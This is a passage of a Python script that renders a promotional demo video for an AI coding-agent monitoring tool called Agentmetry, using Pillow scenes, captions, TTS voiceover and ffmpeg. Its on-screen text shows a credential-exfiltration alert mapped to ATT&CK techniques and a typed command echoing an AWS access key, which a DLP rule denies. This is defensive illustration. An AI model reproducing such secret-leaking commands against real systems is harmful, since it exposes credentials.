        d.text((120, y + 56), "[CRITICAL] credential-exfil", font=S_MONO_L, fill=col(ORANGE, la))
        d.text((120, y + 120), "T1552.004 -> T1071.001", font=S_MONO, fill=col(FG, la))
        d.text((120, y + 172), "correlates 2 events", font=S_MONO, fill=col(MUTED, la))


def ss_block(d, u, L):
    a = scene_alpha(u, L)
    y0 = top(700)
    # DENY
    la = a * appear(u, 0.2)
    panel(d, (70, y0, W - 70, y0 + 330), la)
    d.text((110, y0 + 30), "AGENTMETRY_DLP_MODE=block", font=S_MONO, fill=col(DIM, la))
    d.text((110, y0 + 90), typed("$ echo aws_access_key_id=AKIA…", u, 0.5, 50), font=S_MONO, fill=col(FG, la))
    if u > 1.4:
        sa = la * appear(u, 1.4, 0.25)
        right = stamp(d, 110, y0 + 170, "DENY", S_STAMP, RED, sa, max(0.0, 1 - (u - 1.4) / 1.2))
        d.text((right + 20, y0 + 178), "dlp:aws_access_key", font=S_MONO, fill=col(FG, sa))
        d.text((110, y0 + 260), "recorded: denied, value NOT stored", font=S_MONO, fill=col(MUTED, sa))
    # ASK
    ra = a * appear(u, 3.2)
    y1 = y0 + 370
    panel(d, (70, y1, W - 70, y1 + 330), ra)
    d.text((110, y1 + 30), "policy rule: action: ask", font=S_MONO, fill=col(DIM, ra))
    d.text((110, y1 + 90), typed("$ aws configure set region eu-west-1", u, 3.5, 50), font=S_MONO, fill=col(FG, ra))
    if u > 4.6:
        sa = ra * appear(u, 4.6, 0.25)
        right = stamp(d, 110, y1 + 170, "ASK", S_STAMP, AMBER, sa, max(0.0, 1 - (u - 4.6) / 1.2))
        d.text((right + 20, y1 + 178), "approval required", font=S_MONO, fill=col(FG, sa))
        d.text((110, y1 + 260), "recorded: approval_request, pending", font=S_MONO, fill=col(MUTED, sa))


def ss_siem(d, u, L):
    a = scene_alpha(u, L)
    y0 = top(560) - 40
    sx = 110
    d.rectangle((sx, y0 + 180, sx + 170, y0 + 420), outline=col((120, 117, 110), a), width=2)
    for i in range(8):
        ly = y0 + 205 + i * 26
        d.line((sx + 20, ly, sx + 130 - (i * 17) % 40, ly), fill=col((90, 88, 84), a), width=3)
    d.text((sx, y0 + 440), "local trail", font=S_BODY, fill=col(MUTED, a))
    tx = 560
    for j, name in enumerate(SINKS):
        ty = y0 + 40 + j * 150
        na = a * appear(u, 0.4 + j * 0.3)
        arrow(d, sx + 180, y0 + 300, tx - 20, ty + 30, na, p=ease((u - 0.4 - j * 0.3) / 0.4))
        d.rectangle((tx, ty + 8, tx + 44, ty + 52), outline=col((120, 117, 110), na), width=2)
        d.text((tx + 64, ty + 6), name, font=S_BODY, fill=col(FG, na))
        if u > 1.0 + j * 0.3:
            p = ((u - 1.0 - j * 0.3) * 0.8) % 1.0
            x = sx + 180 + (tx - 20 - sx - 180) * p
            y = y0 + 300 + (ty + 30 - y0 - 300) * p
            d.rectangle((x - 7, y - 7, x + 7, y + 7), fill=col(FG, na * 0.85))


def ss_cta(d, u, L):
    a = scene_alpha(u, L + 0.6)
    y0 = top(460) - 30
    logo(d, y0 + 90, a * appear(u, 0.2, 0.6), s=104, word=S_WORD)
    la = a * appear(u, 1.0)
    w = d.textlength("pip install agentmetry", font=S_MONO_L)
    d.rectangle(((W - w) / 2 - 32, y0 + 230, (W + w) / 2 + 32, y0 + 310), outline=col(BORDER, la), width=2, fill=col((3, 3, 3), la))
    center_text(d, y0 + 248, "pip install agentmetry", S_MONO_L, FG, la)
    center_text(d, y0 + 380, "agentmetry.ai/pilot", S_H1, ORANGE, a * appear(u, 1.8))


SOCIAL = [
    (0, 6, ss_hook),
    (6, 17, ss_detect),
    (17, 25, ss_block),
    (25, 31, ss_siem),
    (31, 37, ss_cta),
]

# Burned-in captions: (start, end, text). Each holds at least 2.5 s.
SOCIAL_CAPTIONS = [
    (0.0, 3.5, "Your coding agent reads a private key, then calls the network."),
    (3.5, 6.0, "Your EDR sees powershell.exe."),
    (6.0, 11.0, "Agentmetry records every tool call your coding agent makes."),
    (11.0, 17.0, "No single call is an alert. The sequence is."),
    (17.0, 21.0, "Record, alert, or block."),
    (21.0, 25.0, "Your policy decides."),
    (25.0, 31.0, "Detections land in the SIEM you already run."),
    (31.0, 37.0, "Open source and local-first. Start a pilot: agentmetry.ai/pilot"),
]

SOCIAL_VO = [
    (0.2, "Your agent reads a private key, then calls the network. Your E D R sees PowerShell."),
    (6.3, "Agentmetry records every tool call your coding agent makes. No single call is an alert. The sequence is."),
    (17.3, "Record, alert, or block. Your policy decides."),
    (25.3, "Detections land in the SIEM you already run."),
    (31.3, "It is open source. Start a pilot at agentmetry dot A I slash pilot."),
]


# --- rendering ---------------------------------------------------------------------------

def configure(cut: str, aspect: str) -> tuple[list, float, list, list | None, Path]:
    global W, H
    if cut == "full":
        W, H = 1920, 1080
        return FULL, FULL[-1][1], FULL_VO, None, ASSETS / "agentmetry-demo-90s.mp4"
    W, H = (1080, 1080) if aspect == "1:1" else (1080, 1350)
    name = "agentmetry-linkedin-1x1.mp4" if aspect == "1:1" else "agentmetry-linkedin-4x5.mp4"
    return SOCIAL, SOCIAL[-1][1], SOCIAL_VO, SOCIAL_CAPTIONS, ASSETS / name


def frame(base: Image.Image, t: float, scenes, cues) -> Image.Image:
    img = base.copy()
    d = ImageDraw.Draw(img)
    for start, end, fn in scenes:
        if start <= t <= end + 0.6:
            fn(d, t - start, end - start)
    if cues:
        caption(d, t, cues)
    return img


def _tts() -> list[str]:
    exe = shutil.which("npx") or shutil.which("npx.cmd")
    if not exe:
        raise SystemExit("npx not found: the voiceover needs `npx hyperframes tts`")
    return [exe, "-y", "hyperframes@0.8.149", "tts"]


def build_voice(lines, duration: float, work: Path) -> Path:
    """One clip per line from local Kokoro, placed at its start time, mixed to one track."""
    work.mkdir(parents=True, exist_ok=True)
    clips = []
    for i, (start, text) in enumerate(lines):
        wav = work / f"line{i:02d}.wav"
        meta = work / f"line{i:02d}.json"
        key = json.dumps([VOICE, VOICE_SPEED, text])
        if not (wav.exists() and meta.exists() and json.loads(meta.read_text())["key"] == key):
            out = subprocess.run(_tts() + [text, "-v", VOICE, "-s", str(VOICE_SPEED), "-o", str(wav), "--json"],
                                 capture_output=True, text=True, check=True)
            info = json.loads(out.stdout.strip().splitlines()[-1])
            meta.write_text(json.dumps({"key": key, "seconds": info["durationSeconds"]}))
        seconds = json.loads(meta.read_text())["seconds"]
        clips.append((start, seconds, wav, text))
    for (s0, n0, _, t0), (s1, _, _, _) in zip(clips, clips[1:] + [(duration, 0, None, "")]):
        if s0 + n0 > s1 - 0.1:
            raise SystemExit(f"voice line at {s0}s runs {n0:.2f}s and overlaps the next at {s1}s: {t0!r}")
    inputs, filters = [], []
    for i, (start, _, wav, _) in enumerate(clips):
        inputs += ["-i", str(wav)]
        ms = int(start * 1000)
        filters.append(f"[{i}:a]adelay={ms}|{ms},apad[a{i}]")
    mix = "".join(f"[a{i}]" for i in range(len(clips)))
    filters.append(f"{mix}amix=inputs={len(clips)}:normalize=0,atrim=0:{duration},loudnorm=I=-16:TP=-1.5[out]")
    track = work / "voice.wav"
    subprocess.run(["ffmpeg", "-y", "-loglevel", "error", *inputs, "-filter_complex", ";".join(filters),
                    "-map", "[out]", "-ar", "48000", str(track)], check=True)
    return track


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--cut", choices=("full", "social"), default="full")
    ap.add_argument("--aspect", choices=("1:1", "4:5"), default="1:1")
    ap.add_argument("--stills", action="store_true")
    ap.add_argument("--no-voice", action="store_true")
    args = ap.parse_args()

    scenes, duration, vo, cues, out = configure(args.cut, args.aspect)
    base = backdrop()
    if args.stills:
        label = "full-16x9" if args.cut == "full" else f"social-{args.aspect.replace(':', 'x')}"
        stills = ASSETS / "demo-stills" / label
        stills.mkdir(parents=True, exist_ok=True)
        for start, end, _ in scenes:
            for frac in (0.55, 0.92):
                t = start + (end - start) * frac
                frame(base, t, scenes, cues).save(stills / f"t{t:05.1f}.png")
        print("stills in", stills)
        return 0

    out.parent.mkdir(parents=True, exist_ok=True)
    silent = out.with_suffix(".silent.mp4")
    cmd = [
        "ffmpeg", "-y", "-loglevel", "error",
        "-f", "rawvideo", "-pix_fmt", "rgb24", "-s", f"{W}x{H}", "-r", str(FPS), "-i", "-",
        "-c:v", "libx264", "-preset", "slow", "-crf", "18", "-pix_fmt", "yuv420p",
        "-movflags", "+faststart", str(silent),
    ]
    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
    n = int(duration * FPS)
    for i in range(n):
        proc.stdin.write(frame(base, i / FPS, scenes, cues).tobytes())
        if i % 300 == 0:
            print(f"frame {i}/{n}", flush=True)
    proc.stdin.close()
    if proc.wait():
        return proc.returncode

    if args.no_voice:
        silent.replace(out)
    else:
        track = build_voice(vo, duration, ASSETS / "voice" / out.stem)
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", str(silent), "-i", str(track),
                        "-c:v", "copy", "-c:a", "aac", "-b:a", "160k", "-shortest", "-movflags", "+faststart",
                        str(out)], check=True)
        silent.unlink()
    # The site and the README link to the full cut's poster by this name.
    poster = "agentmetry-demo-poster.png" if args.cut == "full" else out.stem + "-poster.png"
    frame(base, scenes[-1][0] + 4.5, scenes, cues).save(out.with_name(poster))
    print("wrote", out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
